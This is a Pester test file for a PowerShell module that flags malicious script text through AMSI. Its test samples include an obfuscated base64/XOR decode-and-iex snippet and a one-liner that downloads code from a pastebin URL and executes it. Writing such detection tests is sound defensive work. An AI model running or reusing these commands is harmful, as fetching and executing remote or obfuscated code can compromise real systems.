if ($ENV:AppVEYOR -eq 'true')
{
	Write-Warning "Unable to run these tests on AppVeyor since these tests require Windows 10 or Windows Server 2016."
	return
}

$ENV:APPVEYOR_BUILD_VERSION = '99.99'
. (Join-Path $PSScriptRoot 'CreateModuleManifest.ps1')
$ModulePath = Join-Path $PSScriptRoot 'AMSI.psd1' 
Import-Module $ModulePath -Force 

Describe "Test-AmsiString" {
	Context "Script contains no malware" {
		It "Should return false" {
			Test-AmsiString 'Get-Process' | Should be $false
		}
	}

	Context "Script contains malware" {
		It "Should return true" {
			$BadScript = '$base64 = "FHJ+YHoTZ1ZARxNgUl5DX1YJEwRWBAFQAFBWHgsFAlEeBwAACh4LBAcDHgNSUAIHCwdQAgALBRQ="
						  $bytes = [Convert]::FromBase64String($base64)
						  $string = -join ($bytes | % { [char] ($_ -bxor 0x33) })
						  iex $string'

$BadScript = 'invoke-expression (invoke-webrequest http://pastebin.com/raw.php?i=JHhnFV8m)'

			Test-AmsiString $BadScript | Should be $true


		}
	}
}